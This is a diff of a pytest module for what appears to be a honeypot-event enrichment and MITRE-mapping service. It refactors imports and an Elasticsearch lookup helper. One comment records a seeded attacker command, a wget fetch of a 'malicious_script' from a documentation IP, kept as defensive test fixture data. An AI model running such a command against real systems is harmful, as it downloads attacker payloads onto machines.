@@ -1,11 +1,10 @@
 import pytest
 
-from app.config import get_settings
-from app.es.client import get_es
 from app.seed.seeder import seed
+from app.services.enrichment import write_back_enrichment
 from app.services.llm.schemas import EvidenceCitation
 from app.services.mitre.mapper import MappedTechnique
-from app.services.enrichment import write_back_enrichment
+from tests.conftest import get_event
 
 WGET_EVENT = "seed-botnet-01-008"  # wget http://198.51.100.7/malicious_script
 UNAME_EVENT = "seed-botnet-01-004"  # uname -a
@@ -13,8 +12,7 @@ CONNECT_EVENT = "seed-botnet-01-000"  # cowrie.session.connect, not a command at
 
 
 async def _get_source(event_id: str) -> dict:
-    doc = await get_es().get(index=get_settings().es_index, id=event_id)
-    return doc["_source"]
+    return (await get_event(event_id))["_source"]
 
 
 def _rule_technique(event_id: str) -> MappedTechnique:
